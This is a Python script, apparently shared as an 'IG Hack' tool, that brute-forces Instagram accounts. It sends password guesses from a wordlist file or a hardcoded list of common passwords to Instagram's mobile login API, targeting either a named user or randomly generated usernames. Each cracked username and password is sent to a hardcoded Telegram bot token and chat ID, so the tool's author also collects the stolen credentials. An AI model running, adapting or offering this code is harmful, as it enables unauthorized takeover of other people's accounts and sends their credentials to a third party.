import os
try:
    import requests
    import uuid
    import random
    from faker import Faker
except ModuleNotFoundError:
    os.system('pip install uuid requests faker')

uid = str(uuid.uuid4())
DvD = "android-" + str(uuid.uuid4())

# Colors
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # Red
X = '\033[1;33m'  # Yellow
Z1 = '\033[2;31m'  # Second red
F = '\033[2;32m'  # Green
A = '\033[2;34m'  # Blue
C = '\033[2;35m'  # Pink
B = '\x1b[38;5;208m'  # Orange
Y = '\033[1;34m'  # Light blue
M = '\x1b[1;37m'  # White
S = '\033[1;33m'
U = '\x1b[1;37m'  # White
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'

print(f'''{B}{E}=============================={B}
|{F}[+] YouTube    : {B}|أحمد الحراني 
|{F}[+] TeleGram  : {B} maho_s9    |
|{F}[+] Instagram  : {B}ahmedalharrani |
|{F}[+] Tool  : {B} IG Hack |
{E}==============================''')
token =  ('7677654889:AAHTGrUH-0JHPfUtx_bvQ-LF-oC5Irl1TxQ')
print(X + ' ═════════════════════════════════  ')
ID = ('7381981708')

def linked():
    sg = input(
        f'''
{F}[1] Specific hack - اختراق من يوزر محدد
═════════════════════════════════
{BYellow}[2] Hack Random - اختراق عشوائي
═════════════════════════════════
{B} [{C}⌯{B}] {C}Choose Number {E}» ''')
    if sg == '1':
        mahos()
    elif sg == '2':
        ahmed()

def mahos():
    email = input(f'{X}[+] ENTER Username To Hack Him - اليوزر الي تريد تخترقه: ')
    print(f'{M}_' *60)
    file = input(f'{A}[+] ENTER Name of your Combo Password: ')
    try:
        with open(file, "r") as f:
            for line in f:
                psw = line.strip()
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                           'Accept': '*/*',
                           'Cookie': 'missing',
                           'Accept-Encoding': 'gzip, deflate',
                           'Accept-Language': 'en-US',
                           'X-IG-Capabilities': '3brTvw==',
                           'X-IG-Connection-Type': 'WIFI',
                           'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                           'Host': 'i.instagram.com'}
                data = {'uuid': uid, 'password': psw,
                        'username': email,
                        'device_id': DvD,
                        'from_reg': 'false',
                        '_csrftoken': 'missing',
                        'login_attempt_countn': '0'}
                req = requests.post(url, headers=headers, data=data).json()
                if 'logged_in_user' in req:
                    print(f'{F}Hacked ==> {email} | {psw}')
                    tlg = (f'''
            Hi New Account .!
            ⋘─────━*مهوس*━─────⋙
Username >> {email}
<><><><><><><><><><><><>            
password >> {psw}
<><><><><><><><><><><><>            
BY :  @maho_s9 | @maho9s
⋘─────━❤️🌚━─────⋙
            ''')
                    requests.post(
                        f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))
                else:
                    print(f'{E}Bad ==> {email} | {psw}')
    except FileNotFoundError:
        print(f"File {file} not found - ملف الباسوردات غير موجود")

def ahmed():
    while True:
        fake = Faker()
        email = fake.user_name()
        mazen = [
        '1234567890', '1111111', '000000', '1234567', '123456', '0987654321', '77777777', '2006', '1092', 'qweasdzx',
        'zxcvbnm', 'vcxzsawq', 'polkmn', 'username', 'iloveyou', 'admin123', 'baybay', 'password', '20032003',
        '19901990', '20092009', '20082008', '20002000', '19981998', '90909090', '10101010', '10001000', 'zzxxzzxx',
        'ppooiiuu', 'mmnnbbvv', 'firstlast', '19971997', '20052005', '19991999', '123451234', 'zxcvzxcv',
        '1234512345@12345', 'qqqqwwww', 'qqwweerr', 'zzzzxxxx', '١٢٣٤٥٦', '١٢٣٤٥٦٧٨٩', '1122334455@@', 'Aa123456',
        'mmmmnnnn', 'nnnnmmmm', 'mmnnbbvv', 'zzzzxxxx', 'zzxxccvv', 'qqwweerr', '1234512345@12345', '123@123',
        '1234512345', '123412345', '1234554321', '00998877', '123456123456', '1122334455', '1q2w3e4r5t',
        '1q2w3e4r5t6y', '20202020', '20222022', 'aassddff', '10203040', '1020304050',
        'Anaahmed123', 'Mira777', 'Khaled1999', 'Khaled1997', 'Khaled1998', 'Khaled1996', 'Khaled1995', '102030405060',
        '1q2w3e4r5t', 'qwertyuiop', 'qwertyuiopasdfghjkl'
    ]
        psw = random.choice(mazen)
        url = 'https://i.instagram.com/api/v1/accounts/login/'
        headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                   'Accept': '*/*',
                   'Cookie': 'missing',
                   'Accept-Encoding': 'gzip, deflate',
                   'Accept-Language': 'en-US',
                   'X-IG-Capabilities': '3brTvw==',
                   'X-IG-Connection-Type': 'WIFI',
                   'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                   'Host': 'i.instagram.com'}
        data = {'uuid': uid, 'password': psw,
                'username': email,
                'device_id': DvD,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'}
        req = requests.post(url, headers=headers, data=data).json()
        if 'logged_in_user' in req:
            print(f'{F}Hacked ==> {email} | {psw}')
            tlg = (f'''
            Hi New Account .!
            ⋘─────━*مهوس*━─────⋙
Username >> {email}
<><><><><><><><><><><><>            
password >> {psw}
<><><><><><><><><><><><>            
BY :  @maho_s9 | @maho9s
⋘─────━❤️🌚━─────⋙
            ''')
            requests.post(
                f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))
        else:
            print(f'{E}Bad ==> {email} | {psw}')


linked()
